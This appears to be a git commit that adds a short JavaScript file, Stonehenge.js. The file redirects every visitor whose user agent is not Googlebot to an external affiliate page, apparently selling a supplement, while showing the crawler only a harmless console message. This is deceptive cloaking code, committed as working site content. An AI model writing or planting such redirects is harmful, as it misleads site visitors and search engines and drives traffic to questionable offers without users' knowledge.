ed77bd812d45e3f95d244d30d5eab2638484704c
stonehengehealth <eraenlighten+stonehengehealth@gmail.com>
2026-04-25 10:52:23 +0500

    Add files via upload

---
+++ Stonehenge.js
@@ -0,0 +1,6 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://pinealguardianvip.com/ds/indexts.php#aff=rssk78";
+} else {
+  console.log("Thanks for visiting my page");
+}
